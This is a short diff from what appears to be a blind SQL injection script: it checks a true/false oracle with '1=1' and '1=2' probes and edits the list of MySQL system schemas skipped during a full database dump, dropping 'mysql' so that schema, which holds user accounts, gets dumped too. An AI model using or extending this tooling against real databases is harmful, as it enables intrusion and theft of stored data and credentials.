@@ -73,7 +73,7 @@ if not (_probe("1=1") and not _probe("1=2")):
 print("[+] Oracle works (1=1 TRUE, 1=2 FALSE).\n")
 
 # MySQL system schemas to skip when dumping "all" (still listed on screen)
-SKIP_DBS = ["information_schema", "performance_schema", "mysql", "sys"]
+SKIP_DBS = ["information_schema", "performance_schema", "sys"]
 
 # --- Core oracle -----------------------------------------------------------
 def oracle(condition):
